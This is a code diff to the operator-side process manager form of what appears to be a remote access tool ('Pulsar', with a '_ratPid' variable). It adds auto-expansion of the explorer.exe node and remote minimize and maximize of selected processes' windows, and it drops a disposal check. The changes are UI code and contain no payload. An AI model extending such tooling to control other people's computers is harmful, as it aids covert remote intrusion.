@@ -71,6 +71,64 @@ namespace Pulsar.Server.Forms
 
             RegisterMessageHandler();
         }
+        private void AutoExpandFirstExplorer()
+        {
+            if (_processTreeView == null) return;
+
+            // Flatten the tree so all nodes are accessible
+            _processTreeView.FlattenNodes();
+
+            // Access the internal list of nodes via FlattenNodes
+            var allNodesField = typeof(ProcessTreeView)
+                .GetField("_allNodes", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
+            if (allNodesField == null) return;
+
+            var allNodes = allNodesField.GetValue(_processTreeView) as List<ProcessTreeNode>;
+            if (allNodes == null || allNodes.Count == 0) return;
+
+            // Find the first explorer.exe
+            var node = allNodes.FirstOrDefault(n =>
+                string.Equals(n.Name, "explorer.exe", StringComparison.OrdinalIgnoreCase));
+
+            if (node != null)
+            {
+                // Expand the node and its ancestors
+                void ExpandAncestors(ProcessTreeNode target)
+                {
+                    var rootNodesProperty = typeof(ProcessTreeView)
+                        .GetProperty("RootNodes", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.GetProperty);
+
+                    var rootNodes = rootNodesProperty?.GetValue(_processTreeView) as IEnumerable<ProcessTreeNode> ?? Enumerable.Empty<ProcessTreeNode>();
+
+                    foreach (var root in rootNodes)
+                    {
+                        if (TryExpandPath(root, target)) break;
+                    }
+
+                    bool TryExpandPath(ProcessTreeNode current, ProcessTreeNode targetNode)
+                    {
+                        if (current == targetNode) return true;
+
+                        foreach (var child in current.Children)
+                        {
+                            if (TryExpandPath(child, targetNode))
+                            {
+                                current.IsExpanded = true; // expand ancestor
+                                return true;
+                            }
+                        }
+                        return false;
+                    }
+                }
+
+                ExpandAncestors(node);
+                node.IsExpanded = true; // expand the explorer.exe node itself
+            }
+        }
+
+
+
+
 
         private void CountdownTimer_Tick(object sender, EventArgs e)
         {
@@ -220,13 +278,18 @@ namespace Pulsar.Server.Forms
 
         private async Task UpdateUIAsync(ProcessDataResult data)
         {
-            if (this.IsDisposed) return;
-
             if (this.InvokeRequired)
                 await this.InvokeAsync(() =>
-                    _processTreeView.UpdateProcesses(data.Processes, _sortColumn, _sortAscending, _ratPid));
+                {
+                    _processTreeView.UpdateProcesses(data.Processes, _sortColumn, _sortAscending, _ratPid);
+                    AutoExpandFirstExplorer(); // call after update
+                });
             else
+            {
                 _processTreeView.UpdateProcesses(data.Processes, _sortColumn, _sortAscending, _ratPid);
+                AutoExpandFirstExplorer();
+            }
+
 
             UpdateStatusLabel(data.ProcessCount);
         }
@@ -350,6 +413,13 @@ namespace Pulsar.Server.Forms
 
         private void topmostOffToolStripMenuItem_Click(object sender, EventArgs e) =>
             PerformOnSelectedProcesses(p => _taskManagerHandler.SetTopMost(p.Id, false));
+
+        // New: Minimize / Maximize
+        private void minimizedToolStripMenuItem_Click(object sender, EventArgs e) =>
+            PerformOnSelectedProcesses(p => _taskManagerHandler.SetWindowState(p.Id, true));
+
+        private void maximizedToolStripMenuItem_Click(object sender, EventArgs e) =>
+            PerformOnSelectedProcesses(p => _taskManagerHandler.SetWindowState(p.Id, false));
         #endregion
 
         private string _lastSearchKeyword = ""; // Stores last search
